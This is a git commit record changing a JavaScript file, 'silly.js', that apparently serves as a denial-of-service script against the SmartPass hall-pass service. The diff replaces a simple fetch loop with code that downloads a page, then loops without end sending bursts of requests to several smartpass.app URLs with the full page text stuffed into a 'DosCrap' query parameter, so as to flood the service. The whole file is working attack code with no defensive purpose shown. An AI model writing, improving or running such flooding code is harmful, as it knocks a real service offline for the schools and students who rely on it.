12d5f1e9681b8929cadcf24583870f55bf6c9f46
CampBatt <120993447+CampBatt@users.noreply.github.com>
2024-03-04 21:57:44 -0500

    Update silly.js

--- silly.js
+++ silly.js
@@ -1,9 +1,21 @@
 async function fetchPasses() {
-    while (true) {
-        await fetch("https://app.smartpass.app/main/passes");
-        // Add a delay here before the next fetch
-        await new Promise(resolve => setTimeout(resolve, 0)); // Adjust the delay time as needed (in milliseconds)
-    }
+    await fetch("https://app.smartpass.app/main/passes").then(res =>{
+        res.text().then(async textt => {
+            console.log(textt)
+            while (true) {
+                fetch("https://app.smartpass.app/main/passes" + "?DosCrap=" + textt);
+                fetch("https://www.smartpass.app/" + "?DosCrap=" + textt);
+                fetch("https://app.smartpass.app/main" + "?DosCrap=" + textt);
+                fetch("https://app.smartpass.app/balls" + "?DosCrap=" + textt);
+                fetch("https://app.smartpass.app/balls1" + "?DosCrap=" + textt);
+                fetch("https://app.smartpass.app/balls2" + "?DosCrap=" + textt);
+                fetch("https://app.smartpass.app/balls3" + "?DosCrap=" + textt);
+                await fetch("https://app.smartpass.app/" + "?DosCrap=" + textt);
+                // Add a delay here before the next fetch
+            }
+        })
+    });
+
 }
 
 fetchPasses(); // Start the fetch loop
